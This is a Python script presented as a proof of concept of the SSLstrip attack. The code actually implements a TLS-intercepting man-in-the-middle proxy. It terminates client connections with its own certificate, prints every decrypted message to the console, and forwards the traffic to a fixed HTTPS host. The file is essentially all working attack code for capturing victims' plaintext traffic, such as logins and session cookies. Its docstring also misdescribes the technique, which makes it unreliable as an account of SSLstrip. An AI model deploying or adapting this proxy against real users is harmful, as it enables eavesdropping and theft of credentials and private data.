#!/usr/bin/python
# -*- coding: utf-8

"""
This script is a Poc of the SSLstrip attack presented by Moxie at the BlackHat
conference, in 2008.
"""

__author__  = 'Amélie Risi, Brendan Guevel and Simon Duret'
__version__ = '0.1'
__license__ = 'GPL'
__status__  = 'Development'


import select, socket, ssl, sys, re

FORWARD_HOST        = 'www.t0x0sh.org'
FORWARD_PORT        = 443
PROXY_HOST          = '0.0.0.0'
PROXY_PORT          = 4242
BUFFER_SIZE         = 65537

class HTTPSInterception:
    def __init__(self):
        self.__csockets = dict()

    def __close_conn(self, s):
        if s is not None:
            s.close()
            del self.__csockets[s]

    def __listen(self):
        sock = socket.socket()
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile="ca.crt", keyfile="ca.key")

        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((PROXY_HOST, PROXY_PORT))
        sock.listen(5)
        self.__ssl_context = context
        self.__listen_sock = sock

    def __new_https_conn(self, csock):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        sock = ssl_ctx.wrap_socket(sock, server_hostname=FORWARD_HOST)
        sock.connect((FORWARD_HOST, FORWARD_PORT))
        self.__csockets[csock] = sock
        self.__csockets[sock] = csock

    def __recv(self, csock):
        fw_sock = self.__csockets[csock]
        data = csock.recv(BUFFER_SIZE)
        if len(data) == 0:
            self.__close_conn(csock)
            self.__close_conn(fw_sock)
        else:
            print(data)

            if fw_sock is None:
                self.__new_https_conn(csock)
                fw_sock = self.__csockets[csock]
            fw_sock.send(data)

    def __accept(self):
        csock, fromaddr = self.__listen_sock.accept()
        caddr, cport = fromaddr
        csock = self.__ssl_context.wrap_socket(csock, server_side=True)
        print("New client connected %s:%d" % (caddr, cport))
        self.__csockets[csock] = None

    def __sockets(self):
        return [s for s in self.__csockets] + [self.__listen_sock]

    def __csockets_timeout(self):
        for s in [k for k in self.__csockets]:
            self.__close_conn(s)

    def run(self):
        self.__listen()
        print("Proxy listenning on %s:%d" % (PROXY_HOST, PROXY_PORT))

        while True:
            (reads, _, _) = select.select(self.__sockets(), [], [], 2.0)

            if len(reads) == 0:
                self.__csockets_timeout()
            for s in reads:
                if s == self.__listen_sock:
                    self.__accept()
                else:
                    self.__recv(s)

if __name__ == "__main__":
    httpsinterception = HTTPSInterception()
    httpsinterception.run()
